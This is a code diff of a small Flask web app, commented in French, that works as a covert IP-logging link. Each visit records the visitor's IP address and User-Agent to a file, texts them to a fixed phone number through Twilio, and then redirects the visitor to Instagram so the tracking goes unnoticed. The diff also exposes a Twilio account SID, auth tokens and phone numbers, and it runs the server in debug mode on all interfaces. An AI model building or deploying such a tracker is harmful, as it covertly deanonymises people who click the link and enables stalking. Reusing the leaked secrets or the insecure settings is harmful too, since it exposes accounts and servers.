@@ -1,19 +1,19 @@
 from flask import Flask, request, redirect
 from twilio.rest import Client
-from datetime import datetime
-import traceback
+import datetime
 
 app = Flask(__name__)
 
-# Informations Twilio
-account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
-auth_token = 'ec746c04233667b9836c82d9512a9ee9'
-from_number = '+12524866318'
-to_number = '+33635960569'
+# === CONFIG TWILIO ===
+# Remplace les valeurs ci-dessous par celles de ton compte Twilio
+account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'  # Ton SID Twilio (commence par AC...)
+auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'      # Ton Auth Token
+from_number = '+12524866318'                         # Ton numéro Twilio
+to_number = '+33635960569'                           # Ton numéro de téléphone (destinataire SMS)
 
 client = Client(account_sid, auth_token)
 
-# Fonction d'envoi de SMS
+# === Fonction pour envoyer un SMS ===
 def send_sms(ip_address, user_agent):
     body = f"IP Address: {ip_address}\nUser Agent: {user_agent}"
     try:
@@ -22,35 +22,33 @@ def send_sms(ip_address, user_agent):
             from_=from_number,
             to=to_number
         )
-        print(f"✅ Message sent: {message.sid}")
+        print(f"[✔] SMS envoyé : {message.sid}")
     except Exception as e:
-        print("❌ Error sending SMS:")
-        traceback.print_exc()
+        print(f"[✖] Erreur d'envoi SMS : {e}")
 
-# Fonction d'enregistrement dans logs.txt
+# === Fonction pour écrire dans le fichier log.txt ===
 def log_to_file(ip_address, user_agent):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    log_line = f"[{timestamp}] IP: {ip_address}, User-Agent: {user_agent}\n"
-    try:
-        with open("logs.txt", "a") as log_file:
-            log_file.write(log_line)
-        print("📝 Logged to logs.txt")
-    except Exception as e:
-        print("❌ Error writing to logs.txt:")
-        traceback.print_exc()
+    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    with open("log.txt", "a") as file:
+        file.write(f"[{now}] IP: {ip_address} | User-Agent: {user_agent}\n")
 
-# Route principale
+# === Route principale ===
 @app.route('/')
 def index():
     ip_address = request.remote_addr
     user_agent = request.headers.get('User-Agent')
-    print(f"🔎 IP: {ip_address}, User-Agent: {user_agent}")
 
-    send_sms(ip_address, user_agent)
+    print(f"[→] Visiteur détecté - IP: {ip_address}, UA: {user_agent}")
+
+    # Log dans un fichier
     log_to_file(ip_address, user_agent)
 
-    return redirect("https://www.instagram.com")  # Remplace par ton URL
+    # Envoie par SMS
+    send_sms(ip_address, user_agent)
 
-# Lancement du serveur
+    # Redirection après le tracking
+    return redirect("https://www.instagram.com")
+
+# === Lancement de l'app ===
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
